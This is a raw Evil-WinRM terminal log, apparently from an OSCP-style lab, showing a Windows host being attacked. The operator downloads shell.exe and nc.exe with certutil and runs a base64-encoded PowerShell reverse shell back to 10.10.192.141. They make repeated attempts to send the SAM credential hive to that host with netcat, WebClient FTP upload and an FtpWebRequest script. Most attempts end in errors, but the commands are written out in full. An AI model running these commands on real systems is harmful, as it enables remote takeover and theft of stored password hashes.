+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> dir
+    Directory: C:\Users
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/12/2022   8:31 AM                Administrator
+d-----        11/14/2022   6:35 AM                Administrator.OSCP
+d-----          4/1/2022  10:19 AM                celia.almeda
+d-r---        11/18/2020  11:48 PM                Public
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> cd celia.almeda
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> certutil -urlcache -split -f http://10.10.192.141:9000/shell.exe
+****  Online  ****
+  0000  ...
+  1e00
+CertUtil: -URLCache command completed successfully.
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> dir
+    Directory: C:\Users\celia.almeda
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---          4/1/2022  10:14 AM                3D Objects
+d-r---          4/1/2022  10:14 AM                Contacts
+d-r---        11/21/2022   2:43 AM                Desktop
+d-r---          4/1/2022  10:14 AM                Documents
+d-r---          4/1/2022  10:14 AM                Downloads
+d-r---          4/1/2022  10:14 AM                Favorites
+d-r---          4/1/2022  10:14 AM                Links
+d-r---          4/1/2022  10:14 AM                Music
+d-r---          4/1/2022  10:19 AM                OneDrive
+d-r---          4/1/2022  10:15 AM                Pictures
+d-r---          4/1/2022  10:14 AM                Saved Games
+d-r---          4/1/2022  10:15 AM                Searches
+d-r---          4/1/2022  10:14 AM                Videos
+-a----         3/28/2026   8:13 AM           7680 shell.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> New-SmbMapping -LocalPath "Z:" -RemotePath "\\10.10.192.141\share"
+ -TcpPort 9090
+A parameter cannot be found that matches parameter name 'TcpPort'.
+At line:1 char:68
++ ... ing -LocalPath "Z:" -RemotePath "\\10.10.192.141\share" -TcpPort 9090
++                                                             ~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [New-SmbMapping], ParameterBindingException
+    + FullyQualifiedErrorId : NamedParameterNotFound,New-SmbMapping
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
+Program 'certutil.exe' failed to run: Access is deniedAt line:1 char:1
++ certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
+Program 'certutil.exe' failed to run: Access is deniedAt line:1 char:1
++ certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
+Program 'certutil.exe' failed to run: Access is deniedAt line:1 char:1
++ certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> .\shell.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> .\shell.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
+Program 'certutil.exe' failed to run: Access is deniedAt line:1 char:1
++ certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ certutil -urlcache -split -f http://10.10.192.141:9000/nc.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> certutil -urlcache -split -f  http://10.10.192.141/
+Program 'certutil.exe' failed to run: Access is deniedAt line:1 char:1
++ certutil -urlcache -split -f  http://10.10.192.141/
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ certutil -urlcache -split -f  http://10.10.192.141/
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> Invoke-WebRequest http://10.10.192.141/
+The response content cannot be parsed because the Internet Explorer engine is not available, or Internet
+Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try agai
+n.
+At line:1 char:1
++ Invoke-WebRequest http://10.10.192.141/
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+    + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWeb
+RequestCommand
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> .\shell.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtA
+E8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC
+4AMQAwAC4AMQA5ADIALgAxADQAMQAiACwAOAAwADAAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQ
+AUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0A
+OwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAe
+QB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYw
+B0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgB
+HAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4
+ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9A
+CAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7AC
+QAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQ
+AQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkA
+dABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AO
+wAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+powershell.exe : iex : At line:1 char:49
+    + CategoryInfo          : NotSpecified: (iex : At line:1 char:49
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : + C:\Users\celia.almeda\nc.exe 10.10.192.141 9001 < SAM
+    + CategoryInfo          : NotSpecified: (+ C:\Users\celi...41 9001 < SAM
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : +                                                 ~
+    + CategoryInfo          : NotSpecified: (+              ...            ~
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : The '<' operator is reserved for future use.
+    + CategoryInfo          : NotSpecified: (The '<' operato...r future use.
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : At line:1 char:288
+    + CategoryInfo          : NotSpecified: (At line:1 char:288
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : + ... Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-S ...
+    + CategoryInfo          : NotSpecified: (+ ... Encoding)...1 | Out-S ...
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : +                                                    ~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (+              ...~~~~~~~~~~~~~
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + CategoryInfo          : NotSpecified: (    + CategoryI...arseException
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :     + FullyQualifiedErrorId : RedirectionNotSupported,Microsoft.PowerShell.Commands.Invo
+keExpressionCommand
+    + CategoryInfo          : NotSpecified: (    + FullyQual...essionCommand
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :
+    + CategoryInfo          : NotSpecified: (
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : iex : At line:1 char:49
+    + CategoryInfo          : NotSpecified: (iex : At line:1 char:49
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : + C:\Users\celia.almeda\nc.exe 10.10.192.141 9001 < SAM
+    + CategoryInfo          : NotSpecified: (+ C:\Users\celi...41 9001 < SAM
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : +                                                 ~
+    + CategoryInfo          : NotSpecified: (+              ...            ~
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : The '<' operator is reserved for future use.
+    + CategoryInfo          : NotSpecified: (The '<' operato...r future use.
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : At line:1 char:288
+    + CategoryInfo          : NotSpecified: (At line:1 char:288
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : + ... Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-S ...
+    + CategoryInfo          : NotSpecified: (+ ... Encoding)...1 | Out-S ...
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : +                                                    ~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (+              ...~~~~~~~~~~~~~
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + CategoryInfo          : NotSpecified: (    + CategoryI...arseException
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :     + FullyQualifiedErrorId : RedirectionNotSupported,Microsoft.PowerShell.Commands.Invo
+keExpressionCommand
+    + CategoryInfo          : NotSpecified: (    + FullyQual...essionCommand
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :
+    + CategoryInfo          : NotSpecified: (
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : iex : At line:1 char:54
+    + CategoryInfo          : NotSpecified: (iex : At line:1 char:54
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : + C:\Users\celia.almeda\nc.exe -vvv 10.10.192.141 9001 < SAM
+    + CategoryInfo          : NotSpecified: (+ C:\Users\celi...41 9001 < SAM
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : +                                                      ~
+    + CategoryInfo          : NotSpecified: (+              ...            ~
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : The '<' operator is reserved for future use.
+    + CategoryInfo          : NotSpecified: (The '<' operato...r future use.
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : At line:1 char:288
+    + CategoryInfo          : NotSpecified: (At line:1 char:288
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : + ... Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-S ...
+    + CategoryInfo          : NotSpecified: (+ ... Encoding)...1 | Out-S ...
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : +                                                    ~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (+              ...~~~~~~~~~~~~~
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + CategoryInfo          : NotSpecified: (    + CategoryI...arseException
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :     + FullyQualifiedErrorId : RedirectionNotSupported,Microsoft.PowerShell.Commands.Invo
+keExpressionCommand
+    + CategoryInfo          : NotSpecified: (    + FullyQual...essionCommand
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :
+    + CategoryInfo          : NotSpecified: (
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtA
+E8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC
+4AMQAwAC4AMQA5ADIALgAxADQAMQAiACwAOAAwADAAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQ
+AUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0A
+OwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAe
+QB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYw
+B0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgB
+HAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4
+ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9A
+CAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7AC
+QAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQ
+AQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkA
+dABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AO
+wAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+powershell.exe : iex : At line:1 char:54
+    + CategoryInfo          : NotSpecified: (iex : At line:1 char:54
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : + C:\Users\celia.almeda\nc.exe -vvv 10.10.192.141 9001 < SAM
+    + CategoryInfo          : NotSpecified: (+ C:\Users\celi...41 9001 < SAM
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : +                                                      ~
+    + CategoryInfo          : NotSpecified: (+              ...            ~
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : The '<' operator is reserved for future use.
+    + CategoryInfo          : NotSpecified: (The '<' operato...r future use.
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : At line:1 char:288
+    + CategoryInfo          : NotSpecified: (At line:1 char:288
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : + ... Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-S ...
+    + CategoryInfo          : NotSpecified: (+ ... Encoding)...1 | Out-S ...
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : +                                                    ~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (+              ...~~~~~~~~~~~~~
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + CategoryInfo          : NotSpecified: (    + CategoryI...arseException
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :     + FullyQualifiedErrorId : RedirectionNotSupported,Microsoft.PowerShell.Commands.Invo
+keExpressionCommand
+    + CategoryInfo          : NotSpecified: (    + FullyQual...essionCommand
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :
+    + CategoryInfo          : NotSpecified: (
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : iex : At line:1 char:54
+    + CategoryInfo          : NotSpecified: (iex : At line:1 char:54
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : + C:\Users\celia.almeda\nc.exe -vvv 10.10.192.141 9001 < SAM
+    + CategoryInfo          : NotSpecified: (+ C:\Users\celi...41 9001 < SAM
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : +                                                      ~
+    + CategoryInfo          : NotSpecified: (+              ...            ~
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : The '<' operator is reserved for future use.
+    + CategoryInfo          : NotSpecified: (The '<' operato...r future use.
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : At line:1 char:288
+    + CategoryInfo          : NotSpecified: (At line:1 char:288
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : + ... Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-S ...
+    + CategoryInfo          : NotSpecified: (+ ... Encoding)...1 | Out-S ...
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe : +                                                    ~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (+              ...~~~~~~~~~~~~~
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + CategoryInfo          : NotSpecified: (    + CategoryI...arseException
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :     + FullyQualifiedErrorId : RedirectionNotSupported,Microsoft.PowerShell.Commands.Invo
+keExpressionCommand
+    + CategoryInfo          : NotSpecified: (    + FullyQual...essionCommand
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+powershell.exe :
+    + CategoryInfo          : NotSpecified: (
+:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> .\nc.exe 10.10.192.141 9001 < C:\Windows.old\Windows\System32\SAM
+At line:1 char:29
++ .\nc.exe 10.10.192.141 9001 < C:\Windows.old\Windows\System32\SAM
++                             ~
+The '<' operator is reserved for future use.
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : RedirectionNotSupported,Microsoft.PowerShell.Commands.InvokeExpressionComma
+nd
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/SAM','C
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/SAM','C
+:\Windows.old\Windows\System32\SAM')
+Exception calling "UploadFile" with "2" argument(s): "The remote server returned an error: 227 Entering p
+assive mode (127,0,0,1,166,75).
+."
+At line:1 char:1
++ (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/SAM','C:\W ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/SAM','C
+:\Windows.old\Windows\System32\SAM')
+Exception calling "UploadFile" with "2" argument(s): "The remote server returned an error: 227 Entering p
+assive mode (127,0,0,1,135,135).
+."
+At line:1 char:1
++ (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/SAM','C:\W ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/','C:\W
+indows.old\Windows\System32\SAM')
+Exception calling "UploadFile" with "2" argument(s): "The requested URI is invalid for this FTP command."
+At line:1 char:1
++ (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/','C:\Wind ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/test','
+C:\Windows.old\Windows\System32\SAM')
+Exception calling "UploadFile" with "2" argument(s): "The remote server returned an error: 227 Entering p
+assive mode (127,0,0,1,165,251).
+."
+At line:1 char:1
++ (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/test','C:\ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> $FTPRequest = [System.Net.FtpWebRequest]::Create("ftp://://10.10.1
+92.141")
+$FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+$FTPRequest.Credentials = new-object System.Net.NetworkCredential("anonymous", "")
+$FTPRequest.UseBinary = $true
+$FTPRequest.UsePassive = $false # Set to False for Active mode
+$FileContent = [System.IO.File]::ReadAllBytes("C:\Windows.old\Windows\System32\SAM")
+$FTPRequest.ContentLength = $FileContent.Length
+$Stream = $FTPRequest.GetRequestStream()
+$Stream.Write($FileContent, 0, $FileContent.Length)
+$Stream.Close()
+$Response = $FTPRequest.GetResponse()
+Write-Host "Upload complete: $($Response.StatusDescription)"
+$Response.Close()
+Exception calling "Create" with "1" argument(s): "Invalid URI: The hostname could not be parsed."
+At line:1 char:1
++ $FTPRequest = [System.Net.FtpWebRequest]::Create("ftp://://10.10.192. ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : UriFormatException
+The property 'Method' cannot be found on this object. Verify that the property exists and can be set.
+At line:2 char:1
++ $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : PropertyNotFound
+The property 'Credentials' cannot be found on this object. Verify that the property exists and can be set
+.
+At line:3 char:1
++ $FTPRequest.Credentials = new-object System.Net.NetworkCredential("an ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : PropertyNotFound
+The property 'UseBinary' cannot be found on this object. Verify that the property exists and can be set.
+At line:4 char:1
++ $FTPRequest.UseBinary = $true
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : PropertyNotFound
+The property 'UsePassive' cannot be found on this object. Verify that the property exists and can be set.
+At line:5 char:1
++ $FTPRequest.UsePassive = $false # Set to False for Active mode
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : PropertyNotFound
+The property 'ContentLength' cannot be found on this object. Verify that the property exists and can be s
+et.
+At line:8 char:1
++ $FTPRequest.ContentLength = $FileContent.Length
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : PropertyNotFound
+You cannot call a method on a null-valued expression.
+At line:10 char:1
++ $Stream = $FTPRequest.GetRequestStream()
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+You cannot call a method on a null-valued expression.
+At line:11 char:1
++ $Stream.Write($FileContent, 0, $FileContent.Length)
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+You cannot call a method on a null-valued expression.
+At line:12 char:1
++ $Stream.Close()
++ ~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+You cannot call a method on a null-valued expression.
+At line:14 char:1
++ $Response = $FTPRequest.GetResponse()
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+Upload complete:
+You cannot call a method on a null-valued expression.
